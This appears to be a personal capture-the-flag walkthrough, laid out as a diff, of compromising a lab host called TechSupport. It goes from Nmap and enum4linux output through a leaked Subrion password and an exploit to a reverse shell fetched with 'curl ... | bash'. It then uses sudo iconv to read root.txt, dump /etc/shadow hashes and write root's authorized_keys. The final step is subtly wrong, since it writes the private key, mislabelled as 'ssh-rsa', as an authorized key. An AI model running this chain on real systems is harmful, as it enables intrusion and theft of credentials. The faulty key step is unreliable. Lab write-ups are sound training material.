@@ -1,0 +1,365 @@
+ip add: 10.10.114.66
+
+rustcan:
+
+PORT    STATE SERVICE      REASON
+22/tcp  open  ssh          syn-ack
+80/tcp  open  http         syn-ack
+139/tcp open  netbios-ssn  syn-ack
+445/tcp open  microsoft-ds syn-ack
+
+
+Nmap:
+
+PORT    STATE SERVICE     REASON  VERSION
+22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
+|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ=
+|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
+80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1h49m58s, deviation: 3h10m30s, median: 0s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 37348/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 26637/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 35504/udp): CLEAN (Timeout)
+|   Check 4 (port 36325/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: techsupport
+|   NetBIOS computer name: TECHSUPPORT\x00
+|   Domain name: \x00
+|   FQDN: techsupport
+|_  System time: 2023-01-03T19:41:22+05:30
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-01-03T14:11:22
+|_  start_date: N/A
+
+
+enum4linux:
+enum4linux -v 10.10.114.66
+
+Got OS info for 10.10.114.66 from srvinfo:
+        TECHSUPPORT    Wk Sv PrQ Unx NT SNT TechSupport server (Samba, Ubuntu)
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+  ========================================= 
+|    Share Enumeration on 10.10.114.66    |
+ ========================================= 
+[V] Attempting to get share list using authentication
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        websvr          Disk      
+        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            
+
+ ==================================================== 
+|    Password Policy Information for 10.10.114.66    |
+ ==================================================== 
+[V] Attempting to get Password Policy info with command: polenum '':''@'10.10.114.66' 2>&1
+
+
+[+] Attaching to 10.10.114.66 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+        [+] TECHSUPPORT
+        [+] Builtin
+
+[+] Password Info for Domain: TECHSUPPORT
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: 37 days 6 hours 21 minutes 
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes 
+        [+] Locked Account Duration: 30 minutes 
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
+[V] Attempting to get Password Policy info with command: rpcclient -W '' -U''%'' '10.10.114.66' -c "getdompwinfo" 2>&1
+
+[+] Retieved partial password policy with rpcclient:
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+ ======================================================================= 
+|    Users on 10.10.114.66 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================= 
+[V] Processing SID S-1-5-32-550
+[I] Found new SID: S-1-5-32
+[V] Processing SID S-1-5-32-548
+[V] Processing SID S-1-5-32-551
+[V] Processing SID S-1-5-32-549
+[V] Processing SID S-1-5-32-544
+[V] Processing SID S-1-1-0
+S-1-22-1-1000 Unix User\scamsite (Local User)
+
+
+connect to smb share websvr
+smbclient -N //10.10.114.66/websvr
+
+download enter.txt
+
+GOALS
+=====
+1)Make fake popup and host it online on Digital Ocean server
+2)Fix subrion site,/subrion doesn't work, edit from panel
+3)Edit wordpress website
+
+IMP
+===
+Subrion creds
+|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formul
+Wordpress creds
+|->
+
+
+gobuster:
+└─$ gobuster dir  -u http://10.10.114.66/ -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.114.66/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2023/01/03 09:28:46 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/index.html (Status: 200)
+/phpinfo.php (Status: 200)
+/server-status (Status: 403)
+/test (Status: 301)
+/wordpress (Status: 301)
+
+
+http://10.10.114.66/subrion/robots.txt
+
+User-agent: *
+Disallow: /backup/
+Disallow: /cron/?
+Disallow: /front/
+Disallow: /install/
+Disallow: /panel/
+Disallow: /tmp/
+Disallow: /updates/
+
+
+found subrion admin panel:
+
+http://10.10.114.66/subrion/panel/
+
+Subrion creds
+|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formul
+
+these might be the credentials for subrion; magic formula leads to cyberchef :-> Scam2021
+admin; Scam2021
+try to log on
+
+log on worked!!!
+
+find more info about subrion
+
+Subrion CMS
+Subrion version 4.2.1 installed
+
+searchsploit for subrion 4.2.1
+
+found exploit for arbitrary code 
+
+run exploit and get a shell
+
+create a simple reverse shell in sh, host is and start a listener
+
+on the victim machine download and run the shell
+curl http://10.8.29.89:8000/shell.sh | bash
+
+stabilise the shell using python
+
+go to wordpress folder and read wp-config
+/** MySQL database username */
+define( 'DB_USER', 'support' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
+
+go to /home and notice that there is a scamsite user
+su scamsite using the password from wp-config
+
+sudo -l
+sudo -l
+Matching Defaults entries for scamsite on TechSupport:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User scamsite may run the following commands on TechSupport:
+    (ALL) NOPASSWD: /usr/bin/iconv
+
+read root.txt
+scamsite@TechSupport:/var/www/html/subrion/uploads$ LFILE=/root/root.txt
+LFILE=/root/root.txt
+scamsite@TechSupport:/var/www/html/subrion/uploads$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
+1 -t 8859_1 "$LFILE"-f 8859_ 
+851b8233a8c09400ec30651bd1529bf1ed02790b  -
+
+
+read shadow file:
+
+scamsite@TechSupport:/var/www/html/subrion/uploads$ LFILE=/etc/shadow
+LFILE=/etc/shadow
+scamsite@TechSupport:/var/www/html/subrion/uploads$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
+1 -t 8859_1 "$LFILE"-f 8859_ 
+root:$6$.jnArnoS$vhMAUiCBPWNT/G69DcbUJiD93STewGXfZybhl15/3B2h4H9iuwQVk4o77eHVD5.aDPWQEZgR22FFPvzgsQ/KV1:18775:0:99999:7:::
+daemon:*:18484:0:99999:7:::
+bin:*:18484:0:99999:7:::
+sys:*:18484:0:99999:7:::
+sync:*:18484:0:99999:7:::
+games:*:18484:0:99999:7:::
+man:*:18484:0:99999:7:::
+lp:*:18484:0:99999:7:::
+mail:*:18484:0:99999:7:::
+news:*:18484:0:99999:7:::
+uucp:*:18484:0:99999:7:::
+proxy:*:18484:0:99999:7:::
+www-data:*:18484:0:99999:7:::
+backup:*:18484:0:99999:7:::
+list:*:18484:0:99999:7:::
+irc:*:18484:0:99999:7:::
+gnats:*:18484:0:99999:7:::
+nobody:*:18484:0:99999:7:::
+systemd-timesync:*:18484:0:99999:7:::
+systemd-network:*:18484:0:99999:7:::
+systemd-resolve:*:18484:0:99999:7:::
+systemd-bus-proxy:*:18484:0:99999:7:::
+syslog:*:18484:0:99999:7:::
+_apt:*:18484:0:99999:7:::
+lxd:*:18775:0:99999:7:::
+messagebus:*:18775:0:99999:7:::
+uuidd:*:18775:0:99999:7:::
+dnsmasq:*:18775:0:99999:7:::
+sshd:*:18775:0:99999:7:::
+scamsite:$6$TCBCdrjH$OmTcHNrjHbDc54pJOfTFNhQE2bzcSRkHKO61aFSKkQySm5xOUVZsjVrx7QHh2uT4ozDv9FNkemtw6XFiBJ3Ma1:18775:0:99999:7:::
+mysql:!:18775:0:99999:7:::
+
+
+ Let’s generate public and private ssh keys on our machine to connect as root directly.
+
+ ssh-keygen                       
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): Tech_Support
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in Tech_Support
+Your public key has been saved in Tech_Support.pub
+The key fingerprint is:
+SHA256:dgzef/osMket49JCQmpdqhzaBfk3vv7l9DPpaCaOJq4 kali@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|                 |
+|                 |
+|       ..        |
+|      o..+.      |
+|       *So+  .   |
+|      +.*.+.. .  |
+|     = + = +..+ .|
+|    . +. .B.*X.= |
+|     Eo.oo+@B==.+|
++----[SHA256]-----+
+
+
+cat Tech_Support
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+UVNvR8JfOOmSUAAAAJa2FsaUBrYWxpAQI=
+-----END OPENSSH PRIVATE KEY-----
+
+
+echo "ssh-rsa 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 kali㉿kali" | sudo iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
